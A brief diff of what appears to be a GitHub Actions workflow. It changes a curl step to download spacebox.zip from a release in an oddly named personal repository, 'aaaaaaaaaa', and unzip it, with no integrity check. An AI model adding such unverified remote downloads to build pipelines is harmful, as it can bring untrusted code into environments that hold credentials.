@@ -61,7 +61,7 @@ jobs:
 
       - name: Download and Unzip project
         run: |
-          curl -L --fail -o spacebox.zip https://github.com
+          curl -L --fail -o spacebox.zip https://github.com/iannolavarria-svg/aaaaaaaaaa/releases/download/x/spacebox.zip
           unzip -o spacebox.zip
           rm spacebox.zip
 
